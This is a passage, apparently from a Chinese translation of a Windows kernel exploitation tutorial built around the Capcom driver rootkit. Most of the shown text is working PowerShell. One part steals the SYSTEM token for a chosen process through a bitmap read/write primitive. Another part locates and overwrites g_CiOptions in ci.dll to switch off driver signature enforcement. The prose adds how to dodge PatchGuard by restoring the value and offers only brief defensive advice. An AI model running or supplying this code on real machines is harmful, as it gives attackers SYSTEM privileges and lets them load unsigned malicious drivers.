                $TokenOffset = 0x208          
                $ActiveProcessLinks = 0x188
            }
        }
        # Get EPROCESS entry for System process
        $SystemModuleArray = Get-LoadedModules
        $KernelBase = $SystemModuleArray[0].ImageBase
        $KernelType = ($SystemModuleArray[0].ImageName -split "\\")[-1]
        $KernelHanle = [Capcom]::LoadLibrary("$KernelType")
        $PsInitialSystemProcess = [Capcom]::GetProcAddress($KernelHanle, "PsInitialSystemProcess")
        $SysEprocessPtr = $PsInitialSystemProcess.ToInt64() - $KernelHanle + $KernelBase
        $CallResult = [Capcom]::FreeLibrary($KernelHanle)
        $SysEPROCESS = Bitmap-Read -Address $SysEprocessPtr
        $SysToken = Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)
        Write-Output "`n[+] SYSTEM Token: 0x$("{0:X}" -f $SysToken)"
        # Get EPROCESS entry for PID
        $NextProcess = $(Bitmap-Read -Address $($SysEPROCESS+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
        while($true) {
            $NextPID = Bitmap-Read -Address $($NextProcess+$UniqueProcessIdOffset)
            if ($NextPID -eq $ProcPID) {
                $TargetTokenAddr = $NextProcess+$TokenOffset
                Write-Output "[+] Found PID: $NextPID"
                Write-Output "[+] PID token: 0x$("{0:X}" -f $(Bitmap-Read -Address $($NextProcess+$TokenOffset)))"
                break
            }
            $NextProcess = $(Bitmap-Read -Address $($NextProcess+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
        }
        # Duplicate token!
        Write-Output "[!] Duplicating SYSTEM token!`n"
        Bitmap-Write -Address $TargetTokenAddr -Value $SysToken
    }
### 驱动签名绕过
作为本文的参考文章，建议去读一下由
[@j00ru](https://twitter.com/j00ru)写的关于驱动强制签名的[文章](http://j00ru.vexillium.org/?p=377)。文章指出WINDOWS平台下的代码效验，是通过一个二进制文件ci.dll
(=> %WINDIR%\System32)来管理的。在Windows
8之前，CI导出一个全局布尔变量g_CiEnabled，它很明显的指明签名是启用还是禁用。在Windows
8+中，g_CiEnabled被另一个全局变量g_CiOptions替换，g_CiOptions是标志的组合（ 0x0=disabled,
0x6=enabled, 0x8=Test Mode）。
时间原因，该模块仅通过g_CiOptions来修改代码效验标志，因此只适用Windows
8+。不过类似的方法也适用g_CiEnabled（可以在gihub自行搜索）。基本上，我们将使用和恶意软件Derusbi
一样的技术来绕过签名保护。因为g_CiOptions这个变量并没有被导出，因此我们在pach的时候需要进行一些动态计算。通过反编译
CI!CiInitialize，我们发现它泄露了，一个指向g_CiOptions的指针。
类似地，我们可以不借助任何漏洞，通过用户空间来泄露 CI!CiInitialize的地址。
至此，剩下的就是实现一些指令搜索逻辑，来读取g_CiOptions的值了。首先我们找到第一个jmp(0xe9)指令,然后再找到第一个"mov dword
prt[xxxxx], ecx"
(0x890D)指令，就可以得到g_CiOptions的地址。这样我们就可以把g_CiOptions的值改成任何我们想要的值了。实现这一搜索逻辑的powershell
函数如下：
    function Capcom-DriverSigning {
        param ([Int]$SetValue)
        # Check our bitmaps have been staged into memory
        if (!$ManagerBitmap -Or !$WorkerBitmap) {
            Capcom-StageGDI
            if ($DriverNotLoaded -eq $true) {
                Return
            }
        }
        # Leak CI base => $SystemModuleCI.ImageBase
        $SystemModuleCI = Get-LoadedModules |Where-Object {$_.ImageName -Like "*CI.dll"}
        # We need DONT_RESOLVE_DLL_REFERENCES for CI LoadLibraryEx
        $CIHanle = [Capcom]::LoadLibraryEx("ci.dll", [IntPtr]::Zero, 0x1)
        $CiInitialize = [Capcom]::GetProcAddress($CIHanle, "CiInitialize")
        # Calculate => CI!CiInitialize
        $CiInitializePtr = $CiInitialize.ToInt64() - $CIHanle + $SystemModuleCI.ImageBase
        Write-Output "`n[+] CI!CiInitialize: $('{0:X}' -f $CiInitializePtr)"
        # Free CI handle
        $CallResult = [Capcom]::FreeLibrary($CIHanle)
        # Calculate => CipInitialize
        # jmp CI!CipInitialize
        for ($i=0;$i -lt 500;$i++) {
            $val = ("{0:X}" -f $(Bitmap-Read -Address $($CiInitializePtr + $i))) -split '(..)' | ? { $_ }
            # Look for the first jmp instruction
            if ($val[-1] -eq "E9") {
                $Distance = [Int]"0x$(($val[-3,-2]) -join '')"
                $CipInitialize = $Distance + 5 + $CiInitializePtr + $i
                Write-Output "[+] CI!CipInitialize: $('{0:X}' -f $CipInitialize)"
                break
            }
        }
        # Calculate => g_CiOptions
        # mov dword ptr [CI!g_CiOptions],ecx
        for ($i=0;$i -lt 500;$i++) {
            $val = ("{0:X}" -f $(Bitmap-Read -Address $($CipInitialize + $i))) -split '(..)' | ? { $_ }
            # Look for the first jmp instruction
            if ($val[-1] -eq "89" -And $val[-2] -eq "0D") {
                $Distance = [Int]"0x$(($val[-6..-3]) -join '')"
                $g_CiOptions = $Distance + 6 + $CipInitialize + $i
                Write-Output "[+] CI!g_CiOptions: $('{0:X}' -f $g_CiOptions)"
                break
            }
        }
         # print g_CiOptions
        Write-Output "[+] Current CiOptions Value: $('{0:X}' -f $(Bitmap-Read -Address $g_CiOptions))`n"
        if ($SetValue) {
            Bitmap-Write -Address $g_CiOptions -Value $SetValue
            # print new g_CiOptions
            Write-Output "[!] New CiOptions Value: $('{0:X}' -f $(Bitmap-Read -Address $g_CiOptions))`n"
        }
    }
下面的屏幕截图显示当前g_CiOptions valus是0x6（启用），我们加载“evil.sys”时被阻止。
覆盖该值后，未签名驱动被顺利加载：
稍微有趣的是 g_CiOptions 受 PatchGuard保护，一旦它发现 g_CiOptions 被更改，就会蓝屏 (=>
CRITICAL_STRUCTURE_CORRUPTION) 。然而实际上并不会蓝屏，修改了 g_CiOptions
后PatchGuard并不会马上检测到，如果加载了未签名驱动后，再马上恢复 g_CiOptions，
PatchGuard就无能为力了。我的深度防御建议是在加载驱动时触发PatchGuard
对CI的检查，不过这并不能完全阻止攻击者对加载非法驱动的探索，只是它会提高这一利用过程的难度等级。
### 总结
我相信本文的案例足以证明第三方签名驱动会对WINDOWS
内核构成严重威胁。同时我发现，进行简单的内核破坏比预期更加容易，特别是与PatchGuard延时配合的时候。总之，我觉得最明智的做法是针对驱动白名单部署设备保护，从而从根本上消除这种类型的攻击。
出于学习和测试的目的，我把 [Capcom-Rootkit](https://github.com/FuzzySecurity/Capcom-Rootkit) 放到了github上，Don't be a jackass!
**参考资料：**
\+ Capcom-Rootkit ([@FuzzySec](https://twitter.com/fuzzysec)) -[here](https://github.com/FuzzySecurity/Capcom-Rootkit)  
\+ Windows driver signing bypass by Derusbi -[here](http://www.sekoia.fr/blog/windows-driver-signing-bypass-by-derusbi/)  
\+ A quick insight into the Driver Signature Enforcement
([@j00ru](https://twitter.com/j00ru)) -[here](http://j00ru.vexillium.org/?p=377)  
\+ Defeating x64 Driver Signature Enforcement
([@hFireF0X](https://twitter.com/hfiref0x)) -[here](http://www.kernelmode.info/forum/viewtopic.php?f=11&t=3322)
原文链接：